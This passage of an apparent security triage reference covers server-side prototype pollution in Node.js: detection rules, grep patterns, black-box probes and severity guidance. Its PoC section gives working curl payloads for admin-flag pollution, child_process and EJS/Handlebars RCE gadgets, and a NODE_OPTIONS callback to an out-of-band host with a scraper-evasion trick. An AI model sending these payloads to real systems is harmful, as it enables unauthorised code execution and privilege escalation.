1. A request-bound source: `req.body`, `req.query` (with `extended:true`), `req.params`, `ctx.request.body`, `request.json()`, `parseNested` upload, GraphQL variables.
2. A merge / set / parse sink from the lists above, OR a hand-rolled `for…in` merge / split-reduce path setter.
3. No own-property guard, no allowlist of safe keys, no `Object.create(null)` target, and no reviver/sanitizer between source and sink.

### Configuration heuristics

- Any `lodash`/`hoek`/`deepmerge` version known to be vulnerable + an HTTP-bound merge call → **CONFIRM**.
- `express-fileupload` < 1.1.10 with `parseNested: true` → **CONFIRM** (CVE-2020-7699).
- `qs` with `allowPrototypes: true` → **CONFIRM** for explicit pollution surface.
- `body-parser`'s `extended: true` with downstream merges of `req.body` into shared config → **CONFIRM**.

### Gadget-side detection (defense-in-depth flag, not standalone vuln)

Even without an obvious pollution sink, flag at LOW/INFO when the codebase calls:

- `child_process.exec*`, `child_process.spawn*`, `fork`, `worker_threads.Worker` with an options arg whose contents are not fully literal (i.e., spread, partial object, or merged elsewhere).
- `http.request`, `https.request`, `fetch`, `tls.connect` with a partial options object (no explicit `hostname`, `socketPath`, `path`, `port`, `headers`, `method`).
- `axios` / `axios.create(...)` / `got` / `node-fetch` request calls with a partial config and no explicit `baseURL` / `proxy` (axios resolves unset config keys via the prototype → SSRF / exfiltration), or `nodemailer` `sendMail` whose options omit `cc`/`bcc`.
- A template engine renderer (`ejs`, `pug`, `handlebars`, `lodash.template`, `dot`, `mustache`, `dustjs`, `saker`, `squirrelly`, `node-blade`) where the options object is not a frozen literal.
- BSON `deserialize`, binary-parser `parse`, csv-write-stream `end` with non-frozen options.

These are amplifiers; pair them with any pollution sink for HIGH/CRITICAL impact.

---

## Black-Box Indicators (for triage / dynamic verification, not source-only)

Four reliable non-destructive black-box detection techniques exist. These are the dynamic counterparts of the source-code rules above — include them only as triage notes when the user explicitly asks for dynamic verification.

### 1. Polluted-property reflection in JSON responses

When the server merges a JSON body into an object and then echoes that object back (e.g., from a `PUT /account/settings` handler that returns the updated record), inject a `__proto__` sibling with a harmless key and look for the *injected* key being reflected without `__proto__` itself appearing.

```http
PUT /api/profile HTTP/1.1
Content-Type: application/json

{"email":"a@b","__proto__":{"foo":"bar"}}
```

If the response body shows `"foo":"bar"` (and `__proto__` is gone), pollution succeeded — `JSON.parse` lifted `__proto__` into a real own-property of the parsed object, and a downstream `_.merge`/`Object.assign` walked it onto `Object.prototype`. Then probe gadget properties: `isAdmin`, `canDelete`, `role`, `permissions`.

### 2. Status-code override (non-destructive — works without reflection)

Express + Node.js default to `500 Internal Server Error` for unhandled rejections. Polluting `Object.prototype.status` (or `statusCode`) with a value in the **400–599** range causes the framework to return that injected code instead. A custom code (e.g., `588`) that the app does not normally emit is the strongest signal.

```json
{"__proto__":{"status":588}}
```

After sending: cause an error path on the same endpoint (or any error-throwing route). If the response status code is `588`, pollution is confirmed. The 400–599 range is required because outside that range Express coerces back to 500 and the signal is lost.

### 3. JSON-spaces override (Express-specific — non-destructive)

Express respects an undocumented `json spaces` setting (`app.set('json spaces', N)`) that changes `JSON.stringify` indentation. Polluting `Object.prototype["json spaces"]` causes every JSON response to indent by N — visible in raw response bytes.

```json
{"__proto__":{"json spaces":15}}
```

After sending: any subsequent JSON response from the app comes back indented by 15 spaces instead of compact. Inspect the **raw** HTTP response (not a pretty-printed view) — the indentation is the signal. Works only on Express; absence of indentation change does not rule out SSPP on other frameworks.

### 4. Content-Type / charset override (middleware-level)

Express middleware that parses bodies reads charset from a `content-type` option whose default is missing. Polluting `Object.prototype["content-type"]` with a non-default charset (e.g., `application/json; charset=utf-7`) causes the middleware to decode incoming bodies in that charset on subsequent requests.

```json
{
  "email":"+ADwAaQA-test+AD4-",
  "__proto__":{"content-type":"application/json; charset=utf-7"}
}
```

After sending: re-submit a UTF-7-encoded body and observe whether the server now decodes UTF-7 (where it previously left the bytes as-is). Decoded output in the response body confirms pollution. Use only safe encodings; do not pollute the global charset on a long-lived process you do not own.

### 5. Required-parameter restoration (complementary technique)

A different angle from §1–§4: instead of injecting a *new* observable property, it **restores a missing required one** via pollution. Find a request parameter that **changes the response when omitted** — e.g. removing `name` produces an error because the handler reads `obj.name` on a missing field. Then send pollution payloads (cycling `__proto__` / `constructor.prototype` shapes) that add that property to `Object.prototype`, and re-send the request **with the parameter still omitted**. If the error disappears and the response matches the "value supplied" case, pollution succeeded — the missing own-property now resolves through the polluted prototype.

```http
POST /api/submit HTTP/1.1
Content-Type: application/json

{"__proto__":{"name":"test"}}      ← pollution attempt
```
then resend `{}` (no `name`) and compare to the baseline error.

- Relies on the app converting input into an object and reading a *required* field — common with the `flat` library's `unflatten` (HTB "Gunship" CTF) and Kibana CVE-2019-7609 (`interval`).
- **More destructive** than §1–§4: polluting a field that every request reads can DoS the app (Ghost CMS example). It is also load-balancer-sensitive — the polluted instance may not serve your follow-up request, so send several. Prefer the non-destructive §1–§4 first; use this only when those fail.

### 6. Additional Express / `qs` config-property probes

Express and its `qs`/`body-parser` layer read many behaviours from option objects whose defaults are undefined — each is a non-destructive pollution oracle. Send the `__proto__` payload, then trigger the matching request and observe the side effect:

| Polluted property | Follow-up request | Confirmation signal |
|-------------------|-------------------|---------------------|
| `{"__proto__":{"parameterLimit":1}}` | GET with ≥2 query params | only 1 param parsed/reflected (others dropped) |
| `{"__proto__":{"ignoreQueryPrefix":true}}` | `GET /?​?foo=bar` (double `?`) | `foo=bar` now parses (leading `?` ignored) |
| `{"__proto__":{"allowDots":true}}` | `GET /?foo.bar=baz` | parses to `{foo:{bar:"baz"}}` instead of key `"foo.bar"` |
| `{"__proto__":{"exposedHeaders":["foo"]}}` | any CORS request | response gains `Access-Control-Expose-Headers: foo` |
| `{"__proto__":{"status":510}}` (see §2) | error route | response status becomes 510 |

`exposedHeaders` is a distinct CORS oracle from §2/§3 — it surfaces in a *response header* rather than the body, so it works even when responses are not echoed and JSON formatting is fixed.

### Triage discipline

- Avoid pollution payloads that crash the server (`Object.prototype.toString = ...`, `valueOf`, `hasOwnProperty` overrides). Prefer harmless option keys (`debug`, `pretty`, `xRequestId`, `status`, `json spaces`).
- Each technique above is **non-destructive** (does not break the running server for other users), but pollution **persists for the process lifetime**. Coordinate with the target's operator before testing; pollution of a long-running shared process can affect other tenants until the process is restarted.
- Once pollution is confirmed, *do not* iterate on RCE-class gadgets (`execArgv`, `shell`, `NODE_OPTIONS`) on a live shared environment. Move to a staging/demo target or coordinate explicit windows.
- If reflection (#1) fails, run #2/#3/#4 (and #5) before concluding SSPP is absent — many apps merge user input into a config object that is never echoed back, so absence of reflection is not absence of pollution.

### Dynamic gadget scanners (black-box gadget discovery)

When the pollution sink and the consuming gadget live in *different* code paths (the common server case), automated black-box gadget scanners pair well with the probes above:

- **Out-of-band (OOB) gadget scanners** — for each field of a JSON request, inject `__proto__` gadget payloads and confirm exploitation via an out-of-band interaction (DNS/HTTP), then **auto-revert** each test with a paired null payload so the running app is not left polluted. Include library-config gadgets such as **axios `baseURL`/`proxy`** (SSRF / exfiltration) and **nodemailer `cc`/`bcc`** (email interception). Because detection is OOB, they find gadgets even when the polluted property is consumed long after (and far from) the pollution request.
- **Runtime instrumentation for gadget reads** — instruments JavaScript (Node `--loader` hook or a browser agent) and logs every read of a potentially-polluted property by AST shape (property/element access, `for…in`, the `in` operator, destructuring and default-parameter reads). The `child_process.exec(options.exec)` shape is the canonical server gadget. Lazy-start mode logs only gadgets reachable *after* the pollution point; configurable tracking covers prototypes other than `Object`.

These are dynamic/triage aids — keep their output out of static SAST findings unless a source-level sink + gadget pair is also identified.

---

## Runtime Considerations (Bun / Cloudflare Workers / Deno Deploy / edge)

Not every Node-shaped runtime has the same gadget surface. Knowing the runtime narrows severity:

| Runtime | `child_process.*` available? | `fetch` gadgets reachable? | Typical max-impact |
|---------|:---------------------------:|:--------------------------:|--------------------|
| Node.js | YES | YES | ACI / RCE via polluted `shell` / `NODE_OPTIONS` / `execArgv` |
| Bun | YES (`Bun.spawn`, `child_process` shim) | YES | ACI / RCE — same class as Node |
| Deno | NO (default) — only with `--allow-run` | YES (with `--allow-net`) | SSRF; ACE only with permission |
| Cloudflare Workers | NO | YES (subrequest fetch) | SSRF to internal services, info disclosure |
| Deno Deploy / Vercel Edge | NO | YES | SSRF |
| AWS Lambda (Node runtime) | YES | YES | ACI / RCE — same as Node, but per-invocation memory means pollution does NOT persist across invocations |

For edge runtimes (Cloudflare Workers, Deno Deploy, Vercel Edge), the RCE-class chain is unreachable; cap severity at the SSRF gadget class. For AWS Lambda the *per-invocation* memory isolation means pollution only affects the current request — re-pollution is required for each cold start.

## `process.env` Pollution — Common False Alarm

Polluting `Object.prototype.NODE_ENV` (or any other env-named property) does NOT change `process.env.NODE_ENV`. Node's `process.env` is a host-backed object whose property access is implemented via a libuv-backed getter, not regular prototype-chain lookup. Reads against keys not present in the OS environment return `undefined` — they do NOT fall through to `Object.prototype`.

```javascript
Object.prototype.NODE_ENV = 'production';
process.env.NODE_ENV;                            // still undefined — host-backed access
```

However, pollution of `Object.prototype.NODE_OPTIONS` DOES land when downstream code does `child_process.spawn(cmd, args, { env: { ...process.env } })` and the spawned process inherits the empty-spread, then reads `env.NODE_OPTIONS` through normal prototype lookup. The danger is in *spreading* env into a plain object before passing it to a gadget, not in `process.env` itself.

Treat findings that pivot on `process.env.X` being polluted directly as FALSE POSITIVE; findings that pivot on `{...process.env}` being passed to `child_process.*` are CONFIRMED.

## Object Copying Built-Ins — Pollution-Safety Cheat Sheet

A common false-positive class. Mirror of the CSPP cheat sheet, restated for server-side triage:

| Operation | Pollutes when `src = JSON.parse('{"__proto__":{"x":1}}')`? |
|-----------|:---:|
| `_.merge` / `_.mergeWith` / `_.defaultsDeep` / hand-rolled `for…in` recursive | **YES** |
| `Object.assign(target, src)` | **No** (shallow, own enumerable) |
| `{ ...src }` (object spread) | **No** |
| `Object.fromEntries(Object.entries(src))` | **No** |
| `structuredClone(src)` | **No** (does not walk prototype chain) |
| `Reflect.set(target, key, value)` | **No** (writes own property of target) |
| `target[key] = value` with attacker `key` | **YES** (if `key` is `__proto__` and `target` has a real prototype) |

Recommend `structuredClone` / `Reflect.set` / shallow-spread in remediation when the operation does not need nested copying; recommend `lodash` / `deepmerge` `>= safe-version` *with strict allow-listed keys* when nested merging is required.

## Named Source-Code Tools (research analyzers)

For deeper static analysis, dedicated SSPP research analyzers target prototype pollution specifically:

- **Static-analysis pipelines** — detect pollution sinks and match them against the Node.js stdlib gadget set. Produce ranked findings; underpin many of the table entries above.
- **Universal gadget detectors** — prototype-pollution gadget detection across Node.js and Deno runtimes. Output gadget catalogs like those mirrored in this reference.
- **NPM-package gadget-discovery pipelines** — automated discovery of SSPP gadgets in NPM packages. The NPM-package table in this reference (better-queue, fluent-ffmpeg, gh-pages, cross-spawn, nodemailer, …) draws heavily from such pipelines.
- **Template-engine ACE gadget detectors** — specialised detectors for template-engine ACE chains (ejs, pug, doT, hamlet, mote, jade, ect, ractive.js, saker, dustjs).

When the user asks for "deep" SSPP triage on a real codebase, recommending one of these analyzers is generally higher-value than a hand-rolled grep.

## Static Analysis Coverage

Commonly affected languages: JavaScript/TypeScript only (server-side Node). Tagged CWEs include 915, 78, 79, 94, 400, 471.

Three complementary detection patterns cover SSPP — running all three together gives the broadest signal:

1. **Direct polluting assignment** — `obj[userKey] = …` where key may be `__proto__`/`constructor`; dynamic property write on object with real prototype.
2. **Known polluting library calls** — calls to `_.merge`, `_.defaultsDeep`, `_.set`, `deepmerge`, `Hoek.merge`, `jQuery.extend(true,…)`, `just-extend`, etc. with tainted object argument.
3. **Custom recursive merge/set helpers** — hand-rolled `for…in` copy matching polluting shape; most useful in practice because it finds hand-rolled merges not on the well-known library list.

### SAST grep indicators (server / Node)

Token-aware ripgrep starting points — confirm tainted argument (`req.body`, `req.query`, `ctx.request.body`) and no sanitizer on path:

```bash
# Lodash merge/set/deep-assign on request-bound input
rg -n '\.(merge|mergeWith|defaultsDeep|set|setWith|zipObjectDeep|update)\s*\([^)]*(req\.|body|query|ctx\.|payload|input)' --glob '*.{js,ts}'

# Hand-rolled recursive merge / deep-assign
rg -n 'for\s*\(\s*(const|let|var)\s+\w+\s+in\s+\w+' --glob '*.{js,ts}'

# Bracket assignment from dynamic/user key
rg -n '\w+\[\s*\w+\s*\]\s*=' --glob '*.{js,ts}'

# Path reducer / dotted-key setter (user-controlled path)
rg -n '\.split\s*\(\s*[\'"]\.[\'"]\s*\)\.(reduce|forEach)' --glob '*.{js,ts}'

# Nested-bracket query / config parsers
rg -n 'express\.urlencoded\s*\(\s*\{[^}]*extended:\s*true|parseNested:\s*true|allowPrototypes:\s*true' --glob '*.{js,ts}'

# JSON body merged into shared config
rg -n '(merge|assign|defaults|extend)\s*\([^)]*(config|settings|options|prefs)' --glob '*.{js,ts}'

# flat/unflatten and dotted-key expanders (Gunship-CTF / Kibana CVE-2019-7609 class)
rg -n '\b(unflatten|dot-prop|object-path|flatley)\b|require\([\'"]flat[\'"]\)' --glob '*.{js,ts}'

# Outbound HTTP-client gadgets with partial config (axios baseURL/proxy → SSRF/exfil)
rg -n 'axios\.create\s*\(|\baxios\s*\(|new\s+axios|nodemailer' --glob '*.{js,ts}'

# Bypassable substring-strip "sanitizers" — NOT safe (recursive-strip bypass)
rg -n '\.replace\s*\(\s*/?(__proto__|constructor|prototype)' --glob '*.{js,ts}'
```

High-confidence triad: HTTP source grep + merge/set grep in same handler/module + reachable gadget (`child_process`, `isAdmin`/`canDelete` check, template renderer, `fetch` with partial options).

Classify findings under CWE-78 / 79 / 94 / 400 / 471 / 915 — match your finding's downstream CWE to the gadget reached.

**Sources**: tainted objects (`req.body`, `req.query` with nested keys), user-controlled strings flowing through `JSON.parse`.

**Sanitizers**: `Object.create(null)` target; own-property guard on destination; blocklist for `__proto__`/`constructor`/`prototype`; plain-object guard; `Object.freeze(Object.prototype)` (partial).

JavaScript has no monopoly here: **Python and Ruby have an analogous *class pollution* class** — a recursive merge / mass-assignment over attacker keys that walks object *attributes* reaches shared class- or global-level state instead of a prototype. **Ruby**: a deep-merge / attribute-setter loop that follows `obj.class`, `.superclass`, `instance_variable_set`, or a `send("#{k}=")` chain can write **class variables / class-instance state that persist across requests** (poison a class attribute once → every later request sees it), or reach base-class/`Object` attributes for process-global effect. **Python**: a recursive `setattr`/dict-merge that follows `__class__`, `__base__`/`__bases__`, `__mro__`, `__globals__`, or `__init__.__globals__` writes to a class or module global (polluting another instance's class defaults, or a framework/subprocess global). **SAST signal**: a recursive/deep merge or `setattr`/`instance_variable_set` loop over **attacker-supplied keys** with no allowlist and no block on class/parent/global traversal keys — flag the traversal tokens `class`, `superclass`, `__class__`, `__base__`, `__bases__`, `__mro__`, `__globals__`, `__init__`, `constructor`, `prototype`. Fix: allowlist assignable attributes; never let a merge key select the target's class/parent/global. (Go/Java/Rust lack both the JS prototype chain and this dynamic-attribute-walk, so are not modeled.) PHP `parse_str`/`extract` array pollution is a separate class.

---

## Dynamic Test / PoC

**JSON body pollution** — merge/patch/profile endpoints:

```bash
curl -X POST 'https://TARGET/api/settings' \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"isAdmin":true}}'

curl -X PATCH 'https://TARGET/api/user/profile' \
  -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"role":"admin"}}}'

curl -X PUT 'https://TARGET/api/config' \
  -H 'Content-Type: application/json' \
  -d '{"a":{"__proto__":{"polluted":true}}}'
```

**Pollution reflection** — sibling `__proto__` key echoed back without the key name (see Black-Box Indicators §1); in console on isolated targets: `({}).isAdmin` / `({}).polluted` after merge.

**Blind / OAST gadget confirmation (non-destructive)** — confirms a `child_process`/`NODE_OPTIONS` gadget is *reachable* via an out-of-band DNS hit instead of running a command. When the app later spawns a Node child after the pollution, the polluted `NODE_OPTIONS=--inspect=<OAST-host>` makes that child resolve the OAST host (the inspector bind) → a DNS interaction confirms the chain without RCE:

```bash
# argv0/shell pin the child to node; --inspect triggers a DNS lookup to your OAST host
curl -X POST 'https://TARGET/api/merge' \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--inspect=ID.oastify.com"}}'

# Windows: quote-split the host to evade naive payload scrapers, still resolves at runtime
#   "NODE_OPTIONS":"--inspect=ID\"\".oastify\"\".com"
```

A DNS callback to `ID.oastify.com` confirms `Object.prototype.NODE_OPTIONS` reached a spawned node — escalate to a full gadget only on staging/isolated targets.

**Gadget-to-RCE probes** — staging/isolated targets only; do not run on shared production:

```bash
# child_process / execArgv chain
curl -X POST 'https://TARGET/api/merge' \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"id\").toString())","NODE_OPTIONS":"--require /proc/self/cmdline"}}'

# EJS outputFunctionName gadget
curl -X POST 'https://TARGET/api/settings' \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\"child_process\").execSync(\"id\");s"}}'

# Handlebars AST gadget
curl -X POST 'https://TARGET/api/settings' \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"type":"Program","body":[{"type":"MustacheStatement","params":[],"path":{"type":"PathExpression","original":"constructor"}}]}}'
```

**Express/Pug block gadget** (when Pug renders after merge):

```json
{"__proto__":{"block":{"type":"Text","val":"x]));process.exit()//"}}}
```

---

## Confirming a Finding

1. Identify the pollution sink: name the function (`_.merge`, `_.set`, `qs.parse({allowPrototypes:true})`, hand-rolled `for…in`, etc.) and show the file/line.
2. Trace user input to that sink with no allowlist / `Object.create(null)` / reviver / hasOwn guard in between.
3. Identify at least one reachable gadget. Strong evidence:
   - The same process later calls a Node stdlib API from the table above with a partial options object.
   - The codebase imports a known-vulnerable NPM package (table above) and renders/executes with non-frozen options.
4. Quote the polluted property and its target option (e.g., "`Object.prototype.shell` polluted → `child_process.execSync(cmd, {})` reads `options.shell` from the prototype → ACE").
5. Demonstrate (or cite) the exact attacker payload shape (`{"__proto__":{"shell":"/bin/sh -c \"id\""}}` or `?__proto__[shell]=...`).
6. Distinguish CVSS impact based on the gadget reached: ACI / ACE = CRITICAL; SSRF or template-engine ACE = CRITICAL/HIGH; Path traversal / privesc = HIGH; XSS via dustjs/saker = MEDIUM/HIGH; DoS-only gadget = MEDIUM/LOW.

---

## False Alarms — Do NOT Report

- `JSON.parse` of attacker JSON with no subsequent merge: `__proto__` keys land as own properties, not prototype mutations. The parsed value is safe to read with `Object.hasOwn` or `parsed[key]`.
- A merge where the `target` is `Object.create(null)` *and* the merged value never escapes (no further write to `Object.prototype`).
- Pollution sinks that strip `__proto__`/`constructor`/`prototype` via reviver, allowlist, or own-property guard before walking nested keys. **Caveat:** this only holds for *equality*-based checks (`key === '__proto__'`) or own-property guards. A single-pass *substring* removal (`key.replace(/__proto__/g,'')`) is NOT safe — `__pro__proto__to__` / `constconstructorructor` reconstitute the token after one pass. Do not mark substring-strip "sanitizers" SAFE.
- `_.set` / `_.setWith` where the path argument is fully developer-controlled (constant, derived from a literal map, or from a strict allowlist).
- Patched library versions: `lodash@4.17.21+`, `hoek@4.2.1+`/`6.1.3+`, `deepmerge@4.2.2+` (with default options), `qs@6.10.x+` defaults, `express-fileupload@1.1.10+`, `node@v18.19.0+` (for the `require.main` gadget specifically).
- Gadget-side warnings without a paired pollution sink in the same process. Without the sink, the gadget cannot be triggered remotely. Capped at INFO unless a separate finding establishes the sink.
- Code that runs `Object.freeze(Object.prototype)` at startup, *and* the merge target is not a known-tainted prototype-chain object (Map/Set/typed array). Freeze raises throws in strict mode and silently no-ops in sloppy mode — verify the runtime mode before declaring SAFE.

---

## Severity Heuristics

| Gadget reached | Default severity |
|----------------|:----------------:|
| `child_process.*` (`shell` / `env.NODE_OPTIONS`) → ACI/ACE | **Critical** |
| `process.execArgv` → `--eval=require('child_process').execSync(...)` on next forked child | **Critical** |
| `require` / `import` source pollution → ACE | **Critical** |
| Application authorization gadget (`isAdmin`, `canDelete`, `role`, permission flags) reachable from unauthenticated or low-privilege session | **Critical** (full ATO/privesc) or **High** (limited authz bypass) depending on what the polluted flag unlocks |
| Template-engine ACE (`lodash.template.sourceURL`, `ejs.escapeFunction`, `pug.block`, `handlebars.body`, `bson.evalFunctions`) | **Critical** |
| `worker_threads.Worker` second-order ACE | **Critical** |
| `http(s).request` / `fetch.socketPath` → SSRF reachable to internal services | **High** |
| `tls.connect` → second-order SSRF + TLS validation bypass | **High** |
| `Deno.makeTempDir/File` / `Deno.run.cwd` / NPM `*.LFI*` chains | **High** |
| `Deno.open.*`/`Deno.writeFile.*` privesc and unauthorized-modification | **High** |
| Template-engine XSS gadget (dustjs, saker) | **Medium-High** |
| DoS-only gadget (`http.Server.listen.backlog`, brotli `params`, `yaml.stringify.indent`) | **Medium** |
| Pollution sink without a confirmed reachable gadget | **Low** (defense-in-depth) |

**Downgrade** by one level when: target runs `Object.freeze(Object.prototype)` at startup, or the merge target is `Object.create(null)`, or all known reachable gadgets are dead code, or the only reachable gadget requires a separate already-existing local-file write capability the attacker does not have (`*` LFI gadgets).

---

## Business Risk

- **Process-wide compromise**: pollution affects every plain object in the Node/Deno process for its lifetime. Any handler in any worker thread that later reads an undefined option inherits the attacker's value.
- **Silent escalation**: pollution does not throw — undefined-property reads simply return the polluted value. Detection requires explicit instrumentation or tests.
- **Cross-tenant impact** in multi-tenant Node services: a single tenant's request can change defaults seen by every other tenant for the rest of the process lifecycle.
- **Supply-chain amplification**: the gadget that lands RCE is often inside a transitive dependency (`bson`, `lodash.template`, `nodemailer`) the application never directly invokes — security review of the *direct* dep tree is insufficient.
- **Hard to fix at the boundary**: blocking `__proto__` at the WAF is bypassable via `constructor.prototype` and via nested encoding; the durable fix is at the merge/parse function itself.

---

## Core Principle

Treat every recursive copy / deep merge / property-path setter / nested-bracket query parser whose input is attacker-influenced as a prototype-pollution sink unless it is provably safe via:

1. Explicit allowlist of permitted keys, OR
2. `Object.create(null)` target object that never feeds back into a real `Object`-prototyped object, OR
3. Reviver / sanitizer that strips `__proto__`, `constructor`, `prototype` keys at the boundary, OR
4. A safe library variant (lodash >= 4.17.21, deepmerge with `arrayMerge` and key filter, hoek >= 4.2.1/6.1.3) and confirmed-patched runtime.

Then audit the gadget surface — every options-accepting Node/Deno API and every template engine in the dep tree — and assume any partial / spread / merged options object is reachable by polluted defaults. Pair the sink with the gadget to determine real impact; do not report sink-only or gadget-only findings as Critical.

---

## Analyst Notes

1. The sink is what makes pollution possible; the gadget is what makes it impactful. Always identify both before assigning severity.
2. `JSON.parse` alone is not a pollution sink — the dangerous step is the *next* merge / spread / property-walk.
3. `Object.create(null)` defends only the immediate target. If that prototype-less object is later spread (`{ ...prototypelessObj }`) into a real object and that real object is merged elsewhere, the protection is lost.
4. `Object.freeze(Object.prototype)` is best-effort: it prevents *new* writes but does not undo prior pollution and is often broken by code that monkey-patches `Object.prototype.<some-helper>`.
5. The gadget catalog grows — recheck for new entries (especially in newer Node.js LTS lines) before a final triage.
6. For Deno targets, also enumerate granted permissions (`--allow-net`, `--allow-run`, `--allow-write`); each gadget's blast radius is bounded by them.
7. For template engines, treat any `render(file, locals)` / `compile(src, opts)` call where `opts` is not a frozen literal as a candidate gadget surface — pair with sink to upgrade to CRITICAL.
8. Pure black-box probes for SSPP (e.g., reflected-status-code differences after `?__proto__[debug]=1`) belong in dynamic testing, not SAST output. Use the source-code rules above for static findings.
